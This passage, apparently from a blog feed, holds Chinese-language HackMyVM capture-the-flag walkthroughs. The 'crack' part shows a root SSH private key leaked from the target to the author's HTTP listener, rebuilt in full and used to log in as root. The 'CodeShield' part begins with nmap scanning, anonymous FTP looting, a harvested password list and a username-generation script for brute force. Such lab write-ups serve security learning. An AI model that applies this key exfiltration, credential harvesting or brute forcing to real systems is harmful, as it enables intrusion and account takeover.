192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /s8IoeeQHSidUKBAAAACnJvb3RAY3JhY2s= HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /-----END HTTP/1.1' 404 -

```

我们提取一下

```bash
┌──(kali㉿kali)-[~/test]
└─$ cat tmp 
┌──(kali㉿kali)-[~/test]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /randomfile1 HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /frand2 HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /-----BEGIN HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /NhAAAAAwEAAQAAAYEAxBvRe3EH67y9jIt2rwa79tvPDwmb2WmYv8czPn4bgSCpFmhDyHwn HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /b0IUyyw3iPQ3LlTYyz7qEc2vaj1xqlDgtafvvtJ2EJAJCFy5osyaqbYKgAkGkQMzOevdGt HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /xNQ8NxRO4/bC1v90lUrhyLi/ML5B4nak+5vLFJi8NlwXMQJ/xCWZg5+WOLduFp4VvHlwAf HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /tDh2C+tJp2hqusW1jZRqSXspCfKLPt/v7utpDTKtofxFvSS55MFciju4dIaZLZUmiqoD4k HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET //+FwJbMna8iPwmvK6n/2bOsE1+nyKbkbvDG5pjQ3VBtK23BVnlxU4frFrbicU+VtkClfMu HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /yp7muWGA1ydvYUruoOiaURYupzuxw25Rao0Sb8nW1qDBYH3BETPCypezQXE22ZYAj0ThSl HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /Kn2aZN/8xWAB+/t96TcXogtSbQw/eyp9ecmXUpq5i1kBbFyJhAJs7x37WM3/Cb34a/6v8c HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /9rMjGl9HMZFDwswzAGrvPOeroVB/TpZ+UBNGE1znAAAFgC5UADIuVAAyAAAAB3NzaC1yc2 HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /EAAAGBAMQb0XtxB+u8vYyLdq8Gu/bbzw8Jm9lpmL/HMz5+G4EgqRZoQ8h8J29CFMssN4j0 HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /Ny5U2Ms+6hHNr2o9capQ4LWn777SdhCQCQhcuaLMmqm2CoAJBpEDMznr3RrcTUPDcUTuP2 HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /wtb/dJVK4ci4vzC+QeJ2pPubyxSYvDZcFzECf8QlmYOflji3bhaeFbx5cAH7Q4dgvrSado HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /arrFtY2Uakl7KQnyiz7f7+7raQ0yraH8Rb0kueTBXIo7uHSGmS2VJoqqA+JP/hcCWzJ2vI HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /j8Jryup/9mzrBNfp8im5G7wxuaY0N1QbSttwVZ5cVOH6xa24nFPlbZApXzLsqe5rlhgNcn HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /b2FK7qDomlEWLqc7scNuUWqNEm/J1tagwWB9wREzwsqXs0FxNtmWAI9E4UpSp9mmTf/MVg HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /Afv7fek3F6ILUm0MP3sqfXnJl1KauYtZAWxciYQCbO8d+1jN/wm9+Gv+r/HPazIxpfRzGR HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /Q8LMMwBq7zznq6FQf06WflATRhNc5wAAAAMBAAEAAAGAeX9uopbdvGx71wZUqo12iLOYLg HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /3a87DbhP2KPw5sRe0RNSO10xEwcVq0fUfQxFXhlh/VDN7Wr98J7b1RnZ5sCb+Y5lWH9iz2 HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /m6qvDDDNJZX2HWr6GX+tDhaWLt0MNY5xr64XtxLTipZxE0n2Hueel18jNldckI4aLbAKa/ HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /a4rL058j5AtMS6lBWFvqxZFLFr8wEECdBlGoWzkjGJkMTBsPLP8yzEnlipUxGgTR/3uSMN HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /peiKDzLI/Y+QcQku/7GmUIV4ugP0fjMnz/XcXqe6GVNX/gvNeT6WfKPCzcaXiF4I2i228u HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /TB9Ga5PNU2nYzJAQcAVvDwwC4IiNsDTdQY+cSOJ0KCcs2cq59EaOoZHY6Od88900V3MKFG HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /TwielzW1Nqq1ltaQYMtnILxzEeXJFp6LlqFTF4Phf/yUyK04a6mhFg3kJzsxE+iDOVH28D HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /Unj2OgO53KJ2FdLBHkUDlXMaDsISuizi0aj2MnhCryfHefhIsi1JdFyMhVuXCzNGUBAAAA HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /wQDlr9NWE6q1BovNNobebvw44NdBRQE/1nesegFqlVdtKM61gHYWJotvLV79rjjRfjnGHo HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /0MoSXZXiC/0/CSfe6Je7unnIzhiA85jSe/u2dIviqItTc2CBRtOZl7Vrflt7lasT7J1WAO HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /1ROwaN5uL26gIgtf/Y7Rhi0wFPN289UI2gjeVQKhXBObVm3qY7yZh8JpLPH5w0Xeuo20sP HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /WchZl0D8KSZUKhlPU6Pibqmj9bAAm7hwFecuQMeS+nxg1qIGYAAADBAOZ1XurOyyH9RWIo HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /0sTQ3d/kJNgTNHAs4Y0SxSOejC+N3tEU33GU3P+ppfHYy595rX7MX4o3gqXFpAaHRIAupr HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /DbenB1HQW4o6Gg+SF2GWPAQeuDbCsLM9P8XOiQIjTuCvYwHUdFD7nWMJ5Sqr6EeBV+CYw1 HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /Tg5PIU3FsnN5D3QOHVpGNo2qAvi+4CD0BC5fxOs6cZ1RBqbJ1kanw1H6fF8nRRBds+26Bl HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET //RGZHTBPLVenhNmWN2fje3GDBqVeIbZwAAAMEA2dfdjpefYEgtF0GMC9Sf5UzKIEKQMzoh HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /oxY6YRERurpcyYuSa/rxIP2uxu1yjIIcO4hpsQaoipTM0T9PS56CrO+FN9mcIcXCj5SVEq HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /2UVzu9LS0PdqPmniNmWglwvAbkktcEmbmCLYoh5GBxm9VhcL69dhzMdVe73Z9QhNXnMDlf HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /6xpD9lHWyp+ocD/meYC7V8aio/W9VxL25NlYwdFyCgecd/rIJQ+tGPXoqXIKrf5lVrVtFC HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /s8IoeeQHSidUKBAAAACnJvb3RAY3JhY2s= HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /-----END HTTP/1.1' 404 -

                                                                     
┌──(kali㉿kali)-[~/test]
└─$ awk -F 'GET /' '{print $2}' tmp | awk -F ' HTTP/1.1' '{print $1}' | grep -v '^\s*$'
randomfile1
frand2
-----BEGIN
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
s8IoeeQHSidUKBAAAACnJvb3RAY3JhY2s=
-----END
                                                            
```

尽力了，自己再编辑一下吧

```bash
┌──(kali㉿kali)-[~/test]
└─$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
s8IoeeQHSidUKBAAAACnJvb3RAY3JhY2s=
-----END OPENSSH PRIVATE KEY-----

```

传过去试试

```bash
cris@crack:~$ cd /tmp/                                                                                                                                                                       
cris@crack:/tmp$ wget 192.168.205.141/id_rsa                                                                                                                                                 
--2025-01-23 09:32:12--  http://192.168.205.141/id_rsa                                                                                                                                       
Conectando con 192.168.205.141:80... conectado.                                                                                                                                              
PeticiÃ³n HTTP enviada, esperando respuesta... 200 OK                                                                                                                                         
Longitud: 2590 (2,5K) [application/octet-stream]                                                                                                                                             
Grabando a: Â«id_rsaÂ»                                                                                                                                                                         
                                                                                                                                                                                             
id_rsa                                          100%[======================================================================================================&gt;]   2,53K  --.-KB/s    en 0s     
                                                                                                                                                                                             
2025-01-23 09:32:12 (427 MB/s) - Â«id_rsaÂ» guardado [2590/2590]                                                                                                                               
                                                                                                                                                                                             
cris@crack:/tmp$ chmod 600 id_rsa                                                                                                                                                            
cris@crack:/tmp$ ssh root@127.0.0.1 -i id_rsa                                                                                                                                                
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.                                                                                                                       
ECDSA key fingerprint is SHA256:7z5F9pr6GN7gcEMbKUwipxWswKEpR9bMKOVzGc0V7/s.                                                                                                                 
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes                                                                                                                     
Warning: Permanently added '127.0.0.1' (ECDSA) to the list of known hosts.                                                                                                                   
Linux crack 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64                                                                                                                     
                                                                                                                                                                                             
The programs included with the Debian GNU/Linux system are free software;                                                                                                                    
the exact distribution terms for each program are described in the                                                                                                                           
individual files in /usr/share/doc/*/copyright.                                                                                                                                              
                                                                                                                                                                                             
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent                                                                                                                            
permitted by applicable law.                                                                                                                                                                 
Last login: Wed Jun  7 22:11:49 2023                                                                                                                                                         
root@crack:~# id                                                                                                                                                                             
uid=0(root) gid=0(root) grupos=0(root)                                                                                                                                                       
```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_crack.html</guid><pubDate>Fri, 27 Jun 2025 09:32:54 +0000</pubDate></item><item><title>hmv_CodeShield</title><link>https://7r1UMPHK.github.io/post/hmv_CodeShield.html</link><description># hmv_CodeShield

# 0.简介

**靶机**：[hackmyvm - CodeShield](https://hackmyvm.eu/machines/machine.php?vm=CodeShield)
**难度**：绿色
**目标 IP**：192.168.205.138
**本机 IP**：192.168.205.141

# 1.扫描

`nmap`起手

```
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS --min-rate 10000 -p- -Pn -sV 192.168.205.138
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-20 10:33 CST
Nmap scan report for 192.168.205.138
Host is up (0.046s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           vsftpd 3.0.5
80/tcp    open  http          nginx
110/tcp   open  pop3          Dovecot pop3d
143/tcp   open  imap          Dovecot imapd (Ubuntu)
443/tcp   open  ssl/http      nginx
993/tcp   open  imaps?
995/tcp   open  pop3s?
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
22222/tcp open  ssh           OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
MAC Address: 08:00:27:61:49:1F (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.22 seconds
```

先把我们感兴趣的端口挑出来`21、80、443、22222`，现在就这几个，后面没有头绪再挑

# 2.踩点

我比较喜欢先看ftp21端口。先尝试匿名登录（用户名和密码都是**anonymous**）

```bash
┌──(kali㉿kali)-[~/test/tmp]
└─$ ftp 192.168.205.138
Connected to 192.168.205.138.
220 (vsFTPd 3.0.5)
Name (192.168.205.138:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls -la
229 Entering Extended Passive Mode (|||5258|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        137          4096 Aug 30  2023 .
drwxr-xr-x    2 0        137          4096 Aug 30  2023 ..
-rw-rw-r--    1 1002     1002      2349914 Aug 30  2023 CodeShield_pitch_deck.pdf
-rw-rw-r--    1 1003     1003        67520 Aug 28  2023 Information_Security_Policy.pdf
-rw-rw-r--    1 1004     1004       226435 Aug 28  2023 The_2023_weak_password_report.pdf
226 Directory send OK.
ftp&gt; mget *
mget CodeShield_pitch_deck.pdf [anpqy?]? y
229 Entering Extended Passive Mode (|||47152|)
150 Opening BINARY mode data connection for CodeShield_pitch_deck.pdf (2349914 bytes).
100% |******************************************************************************************|  2294 KiB   76.68 MiB/s    00:00 ETA
226 Transfer complete.
2349914 bytes received in 00:00 (75.26 MiB/s)
mget Information_Security_Policy.pdf [anpqy?]? y
229 Entering Extended Passive Mode (|||40453|)
150 Opening BINARY mode data connection for Information_Security_Policy.pdf (67520 bytes).
100% |******************************************************************************************| 67520       38.67 MiB/s    00:00 ETA
226 Transfer complete.
67520 bytes received in 00:00 (30.61 MiB/s)
mget The_2023_weak_password_report.pdf [anpqy?]? y
229 Entering Extended Passive Mode (|||49281|)
150 Opening BINARY mode data connection for The_2023_weak_password_report.pdf (226435 bytes).
100% |******************************************************************************************|   221 KiB   17.71 MiB/s    00:00 ETA
226 Transfer complete.
226435 bytes received in 00:00 (16.96 MiB/s)

```

去文件管理器查看一下这三个pdf文件

1. CodeShield_pitch_deck.pdf

   在末尾发行人名、邮箱、电话等信息，我们收集起来用于后续的爆破

   ```bash
   Jessica Carlson
   j.carlson@codeshield.hmv
   206-555-0146
   CodeShield
   ```
2. Information_Security_Policy.pdf

   一份安全手册，有CEO的名字，但是我们已经收集过了
3. The_2023_weak_password_report.pdf

   有一个密码本，我们也收集一下

   ```bash
   Xxxxxxxxx001
   Password123!
   Greatplace2work!
   Diciembre@2017
   Hairdresser1!
   1qa2ws3ed4rf
   XXXX12345678
   Hairdresser1
   Xxxxxxxxx002
   Xxxxxxxxxx01
   ```

ftp服务的踩点到此告一段落，接着我们去看看80端口。

![Image](https://github.com/user-attachments/assets/24ede8a5-40bb-426a-89f5-a4315fef09fa)

它加载的特别慢，你可以把这两个拦截一下然后刷新，或者你把**burp**打开，开上代理也可以解决这种问题

![Image](https://github.com/user-attachments/assets/9e82acfd-4587-4d74-9955-4dfdf6f5347a)

将上面的人名加入我们的**user**中，需要注意的是它在**正文也隐藏了一个人名**

![Image](https://github.com/user-attachments/assets/2b3da8c1-a942-450f-9098-9d6c70ca519d)

```bash
Angelina Johnson
Jennifer Cruise
John Doe
Bob Watson
Mohammed Mansour
Xian Tan
Thomas Mitchell
Patrick Early
Kevin Valdez
```

浅浅扫一下漏洞和目录

![Image](https://github.com/user-attachments/assets/4857fc94-ca7c-45ad-911f-6e563f437263)

发现了一个`mail`，但是这个我记得没有洞，倒是可以爆破，后面再试。目前来看应该是爆破ssh服务，但是我们目前收集的用户名是无法直接使用的，需要进行转换

```bash
┌──(kali㉿kali)-[~/test/tmp]
└─$ cat user.py  
import sys

def generate_usernames(names):
    usernames = []

    for name in names:
        parts = name.split()
        if len(parts) &lt; 2:
            print(f'Skipping invalid name: {name}')
            continue  # 如果名字不符合格式（没有姓氏），则跳过这一行
      
        usernames.append(parts[0][0].lower() + parts[1].lower())  # 姓名缩写 + 姓氏
        usernames.append(parts[0].lower() + parts[1].lower())  # 全名
        usernames.append(parts[1].lower() + parts[0][0].lower())  # 姓氏 + 姓名首字母
        usernames.append(parts[0].lower())  # 只用名字
        usernames.append(parts[1].lower())  # 只用姓氏

        usernames.append(parts[0][0].lower() + '.' + parts[1].lower())  # 'j.carlson'

    return usernames

def read_names_from_file(file_path):
    with open(file_path, 'r') as f:
        names = f.readlines()
    # 去除每行末尾的换行符
    return [name.strip() for name in names]

def main():
    if len(sys.argv) != 2:
        print('Usage: python3 a.py &lt;filename&gt;')
        sys.exit(1)

    # 从命令行参数获取文件路径
    file_path = sys.argv[1]
    try:
        # 读取文件中的名字
